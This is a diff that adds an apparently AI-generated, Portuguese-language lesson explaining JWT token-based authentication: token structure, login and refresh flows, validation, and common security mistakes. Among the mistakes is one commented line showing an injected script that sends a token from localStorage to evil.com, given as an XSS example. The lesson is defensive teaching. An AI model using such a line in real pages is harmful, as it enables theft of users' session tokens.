@@ -1,0 +1,215 @@
+---
+title: "Token-Based Authentication (JWT)"
+slug: "token-based-auth"
+room: "backend"
+category: "autenticacao-e-autorizacao"
+difficulty: "intermediate"
+order: 3
+prerequisites: ["session-based-auth"]
+tags: ["jwt", "token", "stateless"]
+aiGenerated: true
+---
+
+## O que é
+
+Token-based authentication é um modelo onde o servidor gera um **token assinado** após o login e o envia ao cliente. O cliente armazena o token e o envia em cada requisição via header `Authorization`. O servidor **não armazena estado** — valida o token verificando a assinatura.
+
+**JWT (JSON Web Token)** é o formato de token mais usado:
+
+```
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Miwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzA1MzUwMDAwfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
+
+Header.Payload.Signature
+```
+
+O JWT tem 3 partes separadas por pontos:
+
+- **Header:** informações sobre o algoritmo usado para assinar (como `HS256`)
+- **Payload:** os dados em si — quem é o usuário, qual o papel, quando expira (`user_id`, `role`, `exp`)
+- **Signature:** uma assinatura digital que garante que ninguém alterou o conteúdo do token
+
+## Por que importa
+
+Token-based auth resolve limitações de session-based:
+
+| Aspecto | Session | Token (JWT) |
+|---|---|---|
+| Estado no servidor | Sim (session store) | Não (stateless) |
+| Escalabilidade | Precisa de Redis/DB compartilhado | Qualquer servidor valida |
+| Mobile/API | Complicado (cookies) | Simples (header Authorization) |
+| Microserviços | Cada serviço acessa o store | Cada serviço valida localmente |
+| Revogação | Instantânea (deletar sessão) | Difícil (token válido até expirar) |
+
+## Como funciona
+
+### Fluxo
+
+```
+1. Login:
+   Cliente → POST /login {email, senha}
+   Servidor → Verifica credenciais
+            → Gera JWT: sign({user_id: 42, role: "admin", exp: 1h}, SECRET)
+            → Retorna: {"token": "eyJhbGci..."}
+
+2. Cliente armazena token (memória, localStorage*)
+   * localStorage é vulnerável a XSS — veja erros comuns
+
+3. Requisições seguintes:
+   Cliente → GET /api/data
+             Authorization: Bearer eyJhbGci...
+   Servidor → Verifica assinatura do JWT
+            → Decodifica payload → user_id: 42, role: admin
+            → Verifica expiração
+            → Retorna dados
+
+4. Token expirado:
+   Servidor → 401 Unauthorized + "Token expired"
+   Cliente → Redireciona para login (ou usa refresh token)
+```
+
+### Anatomia do JWT
+
+```javascript
+// Header (base64)
+{
+    "alg": "HS256",    // Algoritmo de assinatura
+    "typ": "JWT"
+}
+
+// Payload (base64) — NÃO É CRIPTOGRAFADO, apenas codificado!
+{
+    "user_id": 42,
+    "role": "admin",
+    "email": "joao@email.com",
+    "iat": 1705263600,  // Issued At (quando foi gerado)
+    "exp": 1705267200   // Expiration (quando expira)
+}
+
+// Signature
+HMACSHA256(
+    base64(header) + "." + base64(payload),
+    SECRET_KEY
+)
+```
+
+### Refresh Tokens
+
+Por que não usar um token que dura 30 dias direto? Porque se alguém roubar esse token, tem acesso por 30 dias. A solução é usar **dois tokens**: um de acesso curto (se vazou, expira rápido) e um de renovação (guardado com mais segurança, usado só para pegar novos tokens de acesso).
+
+Access token tem vida curta (15min-1h). Refresh token tem vida longa (7-30 dias) e serve para obter novos access tokens sem re-login:
+
+```
+1. Login → recebe access_token (15min) + refresh_token (30 dias)
+2. Usa access_token nas requisições
+3. Access token expira → 401
+4. Envia refresh_token para /api/refresh → recebe novo access_token
+5. Refresh token expira → re-login
+```
+
+### Validação do token
+
+O servidor verifica 3 coisas:
+1. **Assinatura válida** — token não foi alterado
+2. **Não expirado** — `exp` está no futuro
+3. **Claims válidos** — `user_id` existe, `role` é reconhecido
+
+```python
+def validate_token(token):
+    try:
+        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
+        if payload["exp"] < time.time():
+            raise ExpiredTokenError()
+        return payload
+    except jwt.InvalidSignatureError:
+        raise InvalidTokenError("Token adulterado")
+```
+
+## Na prática
+
+```
+Request com JWT:
+
+GET /api/dashboard HTTP/1.1
+Host: api.example.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0.xxx
+
+Servidor decodifica:
+  user_id: 42
+  role: admin
+  exp: 2024-01-16T00:00:00Z ✅ (ainda válido)
+```
+
+## Quando usar (e quando não usar)
+
+### Use JWT quando:
+- **APIs consumidas por mobile + web**
+- **Microserviços** (cada serviço valida localmente)
+- **Cross-domain** (SPA em domínio A, API em domínio B)
+- **Stateless é desejável** (sem session store)
+
+### Use session-based quando:
+- **Revogação instantânea** é necessária (banir usuário imediatamente)
+- **Aplicação web tradicional** (server-rendered)
+- **Segurança é prioridade máxima** (JWT no localStorage = XSS risk)
+
+## Erros comuns
+
+### 1. Armazenar JWT no localStorage
+
+```javascript
+// ❌ Vulnerável a XSS — qualquer script injetado pode roubar
+localStorage.setItem('token', jwt);
+// Script malicioso: fetch('https://evil.com', { body: localStorage.getItem('token') })
+
+// ✅ Opções mais seguras:
+// 1. Cookie HttpOnly (servidor seta, JS não acessa)
+// 2. Memória (variável JavaScript) — perde ao fechar aba
+// 3. Se precisar de localStorage, implemente CSP rigoroso
+```
+
+### 2. Colocar dados sensíveis no payload
+
+```javascript
+// ❌ Payload NÃO é criptografado — qualquer pessoa pode decodificar
+{ "user_id": 42, "password": "123456", "credit_card": "4111..." }
+// base64decode(payload) → dados expostos!
+
+// ✅ Apenas informações mínimas e não-sensíveis
+{ "user_id": 42, "role": "user", "exp": 1705267200 }
+```
+
+### 3. Token sem expiração
+
+```javascript
+// ❌ Token válido para sempre — se vazou, acesso permanente
+{ "user_id": 42, "role": "admin" }  // Sem "exp"
+
+// ✅ Sempre incluir expiração
+{ "user_id": 42, "role": "admin", "exp": 1705267200 }  // Expira em 1h
+```
+
+### 4. Secret key fraca
+
+```python
+# ❌ Chave previsível — atacante pode forjar tokens
+SECRET_KEY = "secret"
+SECRET_KEY = "123456"
+SECRET_KEY = "my-api-key"
+
+# ✅ Chave longa e aleatória
+SECRET_KEY = "a7f3b9c2e1d4f6a8b0c3e5d7f9a1b2c4d6e8f0a2b4c6d8e0f1a3b5c7d9e1f3"
+# Gerar com: openssl rand -hex 32
+```
+
+### 5. Não implementar revogação
+
+JWT é stateless — uma vez gerado, é válido até expirar. Se um token vazar:
+
+```
+❌ Sem revogação: atacante usa token por 1 hora (até expirar)
+
+✅ Soluções:
+1. Blacklist de tokens revogados (em Redis, verificar a cada request)
+2. Tokens de curta duração (15min) + refresh tokens (revogáveis)
+3. Versionar tokens (incrementar "version" no user, invalidar tokens antigos)
+```
